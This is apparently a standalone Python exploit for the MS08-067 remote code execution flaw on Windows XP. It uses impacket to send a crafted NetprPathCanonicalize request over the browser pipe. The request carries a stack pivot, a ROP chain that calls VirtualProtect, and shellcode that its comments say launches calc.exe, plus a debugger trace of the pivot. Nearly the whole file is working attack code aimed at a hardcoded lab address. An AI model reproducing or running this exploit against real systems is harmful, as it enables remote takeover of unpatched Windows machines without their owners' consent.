import socket
import sys
import struct
import sys
import os
from random import randint
from random import choice
from impacket import smb
from impacket import uuid
from impacket import dcerpc
from impacket.structure import Structure
from impacket.dcerpc.v5 import transport

# Convert to unicode string (utf-16le)
def wchar(string):
	return string.encode('utf-16le')

def align(string):
  	return "\x00" * ((4 - (len(string) & 3)) & 3)

def long(string):
  	return struct.pack('<L', string)

def wstring(string):
  	string  = string + "\x00" # null pad
  	return long(len(string)) + long(0) + long(len(string)) + wchar(string) + align(wchar(string))

def uwstring(string):
	string  = string + "\x00" # null pad
	return long(0xdeadbeef) + long(len(string)) + long(0) + long(len(string)) + wchar(string) + align(wchar(string))

def wstring_prebuilt(string):
  	# if the string len is odd, thats bad!
	if len(string) % 2 > 0:
		string = string + "\x00"
	size = len(string) / 2
	return long(size) + long(0) + long(size) + string + align(string)

def mkROP():

    # rop chain generated with mona.py - www.corelan.be
    # ?? 0188f56e -> deadbeef addr
    rop_gadgets = [
    	  # This part is tricky, because it's necessary to fill stack
    	  # Preventing missing bytes on addr: 
    	  #     0x0188f56c: cccc0000 cccccccc cccccccc cccccccc 
    	  0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
    	  0x41414141,  # filler
        #
	      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
	      0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
	      0x7c902afc,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 0x04 [ntdll.dll] 
	      0x7c905990,  # XCHG EAX,ESI # RETN [ntdll.dll] 
	      0x41414141,  # Filler (RETN offset compensation)
	      0x77c22afc,  # POP EBP # RETN [msvcrt.dll] 
	      0x77c354b4,  # & push esp # ret  [msvcrt.dll]
	      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
	      0xa4800201,  # put delta into eax (-> put 0x00000201 into ebx)
	      0x7c927457,  # ADD EAX,5B800000 # POP EBP # RETN 0x14 [ntdll.dll] 
	      0x77c35524,  # JMP_ESP Filler (compensate)
	      0x7c9059c8,  # XCHG EAX,EBX # RETN [ntdll.dll] 
	      0x41414141,  # Filler (RETN offset compensation)
	      0x41414141,  # Filler (RETN offset compensation)
	      0x41414141,  # Filler (RETN offset compensation)
	      0x41414141,  # Filler (RETN offset compensation)
	      0x41414141,  # Filler (RETN offset compensation)
	      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
	      0xa2bf400d,  # put delta into eax (-> put 0x00000040 into edx)
	      0x77c30e26,  # ADD EAX,5D40C033 # RETN [msvcrt.dll] 
	      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
	      0x77c2f188,  # POP ECX # RETN [msvcrt.dll] 
	      0x0188f56c,  # &Writable location [ntdll.dll]
	      0x77c59f34,  # POP EDI # RETN [msvcrt.dll] 
	      0x77c3ea02,  # RETN (ROP NOP) [msvcrt.dll]
	      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
	      0x90909090,  # nop
	      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    	]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def stub():

	# Failed to get VAD root
	# PROCESS 82140780  SessionId: 0  Cid: 03f0 Peb: 7ffdd000  ParentCid: 03f8
    # DirBase: 088802a0  ObjectTable: e1fadc38  HandleCount:  27.
    # Image: calc.exe 
	shellcode = (
		"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
		"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
		"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
		"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
		"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
		"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
		"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
		"\x1c\x39\xbd" 
		)

	p32     = lambda x: struct.pack('<I', x)

	prefix  =  '\\'
	trigger =  '\\..\\..\\'
	pad     =  'ABCDEFG'

	junk_1 = '\x90' * 102 # filler
	junk_1 += mkROP()
	junk_1 += '\x90\x90\x90\x90'
	junk_1 += shellcode
	junk_1 += '\x90' * (508 - len(junk_1))

	'''
		eax=00000084 ebx=00000084 ecx=0188f4a4 edx=0188f4fa esi=0188f496 edi=0188f444
		eip=77c50c79 esp=0188f474 ebp=90909090 iopl=0         nv up ei pl nz na pe nc
		cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
		001b:77c50c79 8b442408        mov     eax,dword ptr [esp+8] ss:0023:0188f47c=90909090
		kd> p
		001b:77c50c7d c3              ret
		kd> p
		001b:77c50ae5 01dc            add     esp,ebx
		kd> p
		001b:77c50ae7 05140cc677      add     eax,77C60C14h
		kd> p
		001b:77c50aec c3              ret
		kd> r
		eax=08569ca4 ebx=00000084 ecx=0188f4a4 edx=0188f4fa esi=0188f496 edi=0188f444
		eip=77c50aec esp=0188f4fc ebp=90909090 iopl=0         nv up ei pl nz na po cy
		cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
		001b:77c50aec c3              ret
		kd> dd 0188f4fc 
		0188f4fc  77c3b860 77c1110c 7c902afc 7c905990
		0188f50c  41414141 77c22afc 77c354b4 77c21d16
		0188f51c  ffffffc1 77c4ec1d 41414141 7c9059c8
		0188f52c  77c3b860 a2bf4fcd 77c30e26 77c58fbc
		0188f53c  77c3b860 a2bf400d 77c30e26 77c14001
		0188f54c  77c2e942 77c3ea02 77c3b860 90909090
		0188f55c  77c12df9 90909090 90909090 46464646
		0188f56c  46464646 46464646 46464646 46464646
	'''
  
   	# ESP Value autmatically randomize your addrs range (0x0180xxxx,0x0184xxxx,0x0194xxxx,0x0190xxxx)
   	# The ideia felt to stack pivoting for @esp+0x84 and hit ROP CHAIN ;)
	junk_2 =  p32(0x90909090) # filler
	junk_2 += p32(0x77c29da7) # XOR EAX,EAX # RETN 
	junk_2 += p32(0x7c9059c8) # XCHG EAX,EBX # RETN
	junk_2 += p32(0x77c3b860) # POP EAX # RETN
	junk_2 += p32(0xffffff7c) # 0x84 to be NEG EAX
	junk_2 += p32(0x77c1be18) # NEG EAX # POP EBP # RETN
	junk_2 += p32(0x90909090) # filler
	junk_2 += p32(0x77c50c77) # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN 
	junk_2 += p32(0x77c50ae5) # ADD ESP,EBX # ADD EAX,MSVCRT.77C60C14 # RETN 
	junk_2 += '\x90' * (78 - len(junk_2))

	path = wchar(prefix) + junk_1 + wchar(trigger) + wchar(pad) + junk_2 + '\x00\x00'
	# Fake path:
	# \AAAAA......\..\..\ABCDEFG\BBBB...\x00\x00 == BOOM 

	payload =  uwstring('P' * 6)
	payload += wstring_prebuilt(path)
	payload += long(2)
	payload += wstring(prefix)
	payload += long(1)
	payload += long(0)
	return payload 

def define_transport(HOST=''):
	rpc_transport = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % HOST)
	try:
		rpc_transport.connect()
		print('[+] Connected on remote Host')

	except IndexError as e:
		print('[-] Can\'t connect to remote Host!')
		print('[-] ', e)

	dce = rpc_transport.DCERPC_class(rpc_transport)
	# https://l.wzm.me/_security/internet/_internet/WinServices/ch04s07s08.html 
	dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
	# NetprPathCanonicalize call
	dce.call(0x1f, stub())

def send_exploit():
	try:
		HOST = "192.168.222.131"
		define_transport(HOST)
		print('[+] Payload sent! waiting for crash!')

	except IndexError as e:
		print('[-] ', e)

def main():
	print('\nMS08-067.py Windows XP x86 RCE')
	print('\tby @w4fz5uck5 08/2019\n')
	send_exploit()

if __name__ == "__main__":
	main()
